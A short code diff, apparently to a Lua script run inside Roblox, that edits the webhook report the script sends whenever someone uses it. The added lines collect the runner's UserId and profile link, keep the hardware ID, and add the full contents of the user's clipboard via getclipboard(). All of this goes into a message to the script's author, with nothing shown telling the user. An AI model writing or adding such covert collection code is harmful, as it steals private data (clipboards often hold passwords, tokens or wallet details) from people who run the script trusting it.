@@ -206,19 +206,24 @@ end
         ["embeds"] = {
             {
                 ["color"] = tonumber("0x32CD32"),
-                ["title"] = "有人正在使用脚本"..os.date("%H").."时"..os.date("%M").."分",
+                ["title"] = "有人正在King使用脚本"..os.date("%H").."时"..os.date("%M").."分",
                 ["thumbnail"] = {
                     ["url"] = AvatarImage,
                 },
                 ["fields"] = {
                     {
-                        ["name"] = "用户名(Name)",
-                        ["value"] = ..game.Players.LocalPlayer.Character.Name,
+                        ["name"] = "名称(Name)",
+                        ["value"] = "||"..player.Name.."||",
                         ["inline"] = true
                     },
                     {
                         ["name"] = "昵称(DisplayName)",
                         ["value"] = player.DisplayName,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "UserId",
+                        ["value"] = "||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. player.UserId .. "/profile") .. ")||",
                         ["inline"] = true
                     },
                     {
@@ -249,6 +254,11 @@ end
                     {
                         ["name"] = "HWID",
                         ["value"] = gethwid(),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "剪贴板",
+                        ["value"] = getclipboard(),
                         ["inline"] = true
                     },
                     {
